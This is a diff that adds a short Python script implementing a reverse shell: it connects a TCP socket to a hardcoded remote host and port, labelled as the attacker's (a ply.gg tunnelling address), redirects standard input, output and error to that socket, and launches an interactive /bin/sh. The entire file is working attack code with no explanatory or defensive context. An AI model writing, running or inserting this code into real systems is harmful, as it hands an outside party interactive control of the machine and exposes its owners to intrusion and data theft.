@@ -1,0 +1,25 @@
+import socket
+import subprocess
+import os
+import sys
+
+def reverse_shell(ip, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+
+        # Redirect standard file descriptors
+        for fd in (0, 1, 2):
+            os.dup2(s.fileno(), fd)
+
+        # Launch interactive shell
+        subprocess.call(["/bin/sh", "-i"])
+    except Exception as e:
+        sys.stderr.write(f"Connection failed: {e}\n")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    # Replace with actual attacker IP and port
+    attacker_ip = "publications-rhythm.gl.at.ply.gg"
+    attacker_port = 26394
+    reverse_shell(attacker_ip, attacker_port)
